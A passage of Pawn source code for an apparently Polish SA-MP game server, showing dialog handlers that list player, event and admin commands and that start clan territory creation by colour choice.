		case DIALOG_CMD7:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/idzdo "C_WHITE"(Wysy³asz proœbê o teleport)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/solo "C_WHITE"(Wysy³asz propozycjê pojedynku solo)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/pm "C_WHITE"(Wysy³asz prywatn¹ wiadomoœæ do gracza)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/re "C_WHITE"(Odpisujesz na ostatni¹, prywatn¹ wiadomoœæ)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/yt "C_WHITE"(Odtwarzanie utworu z YouTube)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/day "C_WHITE"(Sprawdzasz atrakcje dnia)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/eq "C_WHITE"(Przegl¹dasz ekwipunek)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/skins "C_WHITE"(Przegl¹dasz skiny na broñ)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD8, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (8/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD8:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/klan "C_WHITE"(Panel klanu)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/klany "C_WHITE"(Przegl¹dasz istniej¹ce klany)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/cc "C_WHITE"(Tworzysz w³asny klan)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/stats "C_WHITE"(Przegl¹dasz statystyki serwera)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/sklep "C_WHITE"(Przegl¹dasz sklep)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/vmode "C_WHITE"(Zarz¹dzasz widocznoœci¹ szaty graficznej)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/loadskin "C_WHITE"(Wczytujesz ostatnio zapisanego skina)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/skin "C_WHITE"(Zmieniasz skina)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD9, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (9/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD9:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/buy "C_WHITE"(Akceptujesz ofertê kupna prywatnego pojazdu)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/pv "C_WHITE"(Panel prywatnego pojazdu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/flip "C_WHITE"(Obracasz pojazd)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/cvc "C_WHITE"(Zmieniasz kolor pojazdu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/v "C_WHITE"(Przywo³anie pojazdu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/100hp "C_WHITE"(Uleczenie siê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/kami "C_WHITE"(Kupno kamizelki)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/admins "C_WHITE"(Przegl¹dasz listê aktywnych administratorów)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD10, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (10/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD10:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/lag "C_WHITE"(Sprawdzasz stan PacketLoss graczy)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/rsp "C_WHITE"(Respawnujesz siê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/leave "C_WHITE"(Komenda do przerywania czynnoœci serwerowych)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/gl "C_WHITE"(Arena glitch)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/players "C_WHITE"(Panel wyszukiwania graczy)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/mystats "C_WHITE"(Wyœwietlasz swoje statystyki)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/tune "C_WHITE"(Tuningujesz pojazd)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/pogoda "C_WHITE"(Zmiana pogody)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD11, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (11/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
    case DIALOG_CMD11:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/mail "C_WHITE"(Dodanie adresu e-mail do konta)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/checkafk "C_WHITE"(Sprawdzenie punktów aktywnoœci gracza)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (12/12)", cmdstr, "Zamknij", "");
		    }
		    else return 1;
		}
		case DIALOG_ADMIN1:
		{
		    if(response)
		    {
		        new cmdstr[2048];
  				format(cmdstr, sizeof(cmdstr), "{FF0000}/wypisz "C_WHITE"(Wypisanie gracza z zabaw, "JUNIOR""C_WHITE")\n");
  				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/busted "C_WHITE"(Tryb nagrywania Busted, "JUNIOR""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/killp "C_WHITE"(Zabicie innego gracza, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/warn, /delwarn "C_WHITE"(Zarz¹dzanie ostrze¿eniami, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/vw "C_WHITE"(Przeniesienie gracza do innego VW, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/forcesave "C_WHITE"(Zapis cudzego, prywatnego pojazdu, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/sevent "C_WHITE"(Wymuszony start Eventu serwera, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/ban, /offban, /unban "C_WHITE"(Banowanie i odbanowywanie, "ADMIN""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/addcash "C_WHITE"(Dodawanie graczowi gotówki, "VHA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/tpall "C_WHITE"(Teleportacja wszystkich do siebie, "VHA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/addexp "C_WHITE"(Dodawanie graczowi EXP, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/newh "C_WHITE"(Tworzenie nowego domu, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/hreset "C_WHITE"(Reset wybranego domu, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/giveadmin "C_WHITE"(Edycja rangi gracza, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/sendrcon "C_WHITE"(Wykonanie komendy RCON, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/tpxyz "C_WHITE"(Teleportacja do koordynatów XYZ, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/createpart "C_WHITE"(Tworzenie nowej czêœci samochodowej, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/createarrow "C_WHITE"(Rozpoczêcie tworzenia nowej strza³ki, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/arrowend "C_WHITE"(Koñczenie tworzenia nowej strza³ki, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/createipark "C_WHITE"(Tworzenie nowego ItemParku, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/createvehicle "C_WHITE"(Tworzenie nowego pojazdu na mapie, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/createtransport "C_WHITE"(Tworzenie nowej trasy spedycyjnej, "HA""C_WHITE")\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s{FF0000}/crblock "C_WHITE"(Blokowanie po³¹czeñ z danego kraju, "HA""C_WHITE")", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» {FF0000}Komendy administracyjne (2/2)", cmdstr, "Zamknij", "");
		    }
		    else return 1;
		}
		case DIALOG_CMDHELP:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0: {
					    new cmdstr[2048];
    					format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/rozbroj "C_WHITE"(Rozbrajasz siê)\n");
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/obiekty "C_WHITE"(Zarz¹dzasz widocznoœci¹ obiektów)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/spadochron "C_WHITE"(Dostajesz spadochron)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/aparat "C_WHITE"(Dostajesz aparat)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/gunsid "C_WHITE"(Sprawdzasz ID broni)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/id "C_WHITE"(Wyszukujesz ID gracza po fragmencie nicku)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/osiagniecia "C_WHITE"(Sprawdzanie osi¹gniêæ)\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/sms "C_WHITE"(Do³adowanie portfela przez SMS)", cmdstr);
						return ShowPlayerDialog(playerid, DIALOG_CMD1, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (1/12)", cmdstr, "Dalej", "Zamknij"); }
					case 1:
					{
						new dialog[2048];
						format(dialog, sizeof(dialog), ""C_BLUE1"/evc "C_WHITE"(Tworzenie eventu)\n");
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evj "C_WHITE"(Do³¹czanie do eventu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evl "C_WHITE"(Opuszczanie eventu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/eva "C_WHITE"(Dodanie gracza do eventu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evcar "C_WHITE"(Przydzielanie graczowi pojazdu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evcara "C_WHITE"(Przydzielanie wszystkim pojazdu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evk "C_WHITE"(Wyrzucanie gracza z eventu)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evkn50 "C_WHITE"(Wyrzucanie graczy nie bêd¹cych 50m od organizatora)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evtp "C_WHITE"(Teleportacja jednego gracza do drugiego)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evf "C_WHITE"(Zamra¿anie gracza)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evuf "C_WHITE"(Odmra¿anie gracza)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evfa "C_WHITE"(Zamra¿anie wszystkich)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evufa "C_WHITE"(Odmra¿anie wszystkich)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evhp "C_WHITE"(Ustawianie graczowi konkretnego poziomu HP i kamizelki)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evhpa "C_WHITE"(Ustawianie wszystkim konkretnego poziomu HP i kamizelki)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evd "C_WHITE"(Rozbrojenie gracza)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evda "C_WHITE"(Rozbrojenie wszystkich)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evgg "C_WHITE"(Przydzielenie graczowi broni z dan¹ amunicj¹)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evgga "C_WHITE"(Przydzielenie wszystkim broni z dan¹ amunicj¹)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evskin "C_WHITE"(Ustawienie konkretnego skina danemu graczowi)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evskina "C_WHITE"(Ustawienie uczestnikom konkretnego skina)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/evt "C_WHITE"(Przydzielenie nagrody za event)\n", dialog);
						format(dialog, sizeof(dialog), "%s"C_BLUE1"/eve "C_WHITE"(Zakoñczenie eventu)", dialog);
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy eventu", dialog, "Zamknij", "");
					}
					case 2:
					{
					    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
					    new cmdstr[4096];
						format(cmdstr, sizeof(cmdstr), "{FF0000}/spec "C_WHITE"(Podgl¹d innego gracza, "JUNIOR""C_WHITE")\n");
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/explode "C_WHITE"(Eksplozja wokó³ innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/specoff "C_WHITE"(Wy³¹czenie podgl¹du, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/savepos "C_WHITE"(Zapis pozycji administratora, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/cd "C_WHITE"(Globalne odliczanie, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/jail "C_WHITE"(Uwiêzienie innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/unjail "C_WHITE"(Wypuszczenie z wiêzienia, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/walizka, /figurka, /bomba "C_WHITE"(K³adzenie znajdziek, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/delwalizka, /delfigurka, /delbomba "C_WHITE"(Usuwanie znajdziek, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/mute "C_WHITE"(Wyciszenie innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/unmute "C_WHITE"(Odciszenie innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/disarmp "C_WHITE"(Rozbrojenie innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/freeze, /unfreeze "C_WHITE"(Zamra¿anie i odmra¿anie innego gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/respawn "C_WHITE"(Respawn pojazdów, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/ann "C_WHITE"(Komunikat na œrodku ekranu, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/kick "C_WHITE"(Wyrzucenie gracza z serwera, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/vote "C_WHITE"(Rozpoczêcie g³osowania, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/eye "C_WHITE"(Zarz¹dzanie podgl¹dem komend, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/cchat "C_WHITE"(Czyszczenie czatu, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/tt, /th "C_WHITE"(Teleportacja graczy, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/ip "C_WHITE"(Sprawdzanie IP gracza gracza, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/cobj "C_WHITE"(Sprawdzanie, czy gracz ma widoczne obiekty, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/ccheats "C_WHITE"(Sprawdzanie, czy gracz ma cheaty z /cheats, "JUNIOR""C_WHITE")\n", cmdstr);
						format(cmdstr, sizeof(cmdstr), "%s{FF0000}/jetpack "C_WHITE"(Przydzielenie sobie jetpacka, "JUNIOR""C_WHITE")\n", cmdstr);
						return ShowPlayerDialog(playerid, DIALOG_ADMIN1, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» {FF0000}Komendy administracyjne (1/2)", cmdstr, "Dalej", "Zamknij");
					}
				}
			}
		}
		case DIALOG_KLANKOLOR:
		{
		    if(!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
				    case 0: {
				        ClanColor[playerid] = 0;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 1: {
				        ClanColor[playerid] = 1;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 2: {
				        ClanColor[playerid] = 2;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 3: {
				        ClanColor[playerid] = 3;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 4: {
				        ClanColor[playerid] = 4;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 5: {
				        ClanColor[playerid] = 5;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 6: {
				        ClanColor[playerid] = 6;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 7: {
				        ClanColor[playerid] = 7;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 8: {
				        ClanColor[playerid] = 8;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 9: {
				        ClanColor[playerid] = 9;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 10: {
				        ClanColor[playerid] = 10;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 11: {
				        ClanColor[playerid] = 11;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
